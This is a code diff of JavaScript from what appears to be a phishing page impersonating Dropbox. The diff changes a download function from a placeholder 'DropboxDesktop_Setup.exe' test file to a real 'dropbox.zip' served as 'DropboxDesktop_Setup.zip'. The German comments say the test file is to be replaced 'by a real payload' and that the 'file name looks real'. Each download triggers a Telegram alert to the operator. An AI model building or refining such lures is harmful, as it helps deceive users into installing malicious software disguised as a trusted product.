@@ -496,22 +496,16 @@
     }
 
     // Download Funktion
-    function startDownload() {
-      // Test-Datei Download (später durch echte Payload ersetzen)
-      const payloadContent = 'Dropbox Desktop Installer\n\nThis is a test payload file.\nSession: ' + sessionID + '\nTime: ' + new Date().toISOString();
-      const blob = new Blob([payloadContent], { type: 'application/octet-stream' });
-      const url = URL.createObjectURL(blob);
-      const a = document.createElement('a');
-      a.href = url;
-      a.download = 'DropboxDesktop_Setup.exe'; // Dateiname sieht echt aus
-      document.body.appendChild(a);
-      a.click();
-      document.body.removeChild(a);
-      URL.revokeObjectURL(url);
-      
-      // Telegram Benachrichtigung über Download (zweiter Klick)
-      sendTelegramMessage('📥 DOWNLOAD STARTED', 'User clicked notification and download was initiated');
-    }
+function startDownload() {
+  const a = document.createElement('a');
+  a.href = './dropbox.zip';  // oder 'dropbox.zip'
+  a.download = 'DropboxDesktop_Setup.zip';
+  document.body.appendChild(a);
+  a.click();
+  document.body.removeChild(a);
+  
+  sendTelegramMessage('📥 DOWNLOAD STARTED', 'User downloaded zipfile');
+}
 
     // Notification mit Klick-Handler
     function showNotification() {
